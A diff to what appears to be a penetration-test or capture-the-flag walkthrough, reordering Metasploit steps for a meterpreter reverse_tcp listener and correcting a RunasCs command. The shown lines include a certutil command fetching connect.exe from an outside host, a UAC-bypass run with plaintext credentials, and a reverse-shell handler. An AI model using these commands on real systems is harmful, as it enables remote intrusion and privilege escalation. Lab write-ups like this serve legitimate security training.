@@ -1110,10 +1110,10 @@ Saved as: /var/www/html/connect.exe
 ### 6.2. Stage meterpreter listener
 
 ```sh
-msf6 > use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
 PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 > use exploit/multi/handler
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > set LHOST 0.0.0.0
 LHOST => 0.0.0.0
 msf6 exploit(multi/handler) > set LPORT 4445
@@ -1176,7 +1176,7 @@ certutil.exe -urlcache -f -split http://192.168.99.12:8080/connect.exe
 CertUtil: -URLCache command completed successfully.
 
 C:\temp>.\RunasCs.exe --bypass-uac -l 5 wao WebAO1337 connect.exe
-.\RunasCs.exe --bypass-uac -l 5 wao WebAO1337 reverse4445
+.\RunasCs.exe --bypass-uac -l 5 wao WebAO1337 connect.exe
 [-] RunasCsException: Selected logon type '5' is not granted to the user 'wao'. Use available logon type '2'.
 C:\temp>.\RunasCs.exe --bypass-uac wao WebAO1337 connect.exe
 .\RunasCs.exe --bypass-uac wao WebAO1337 connect.exe
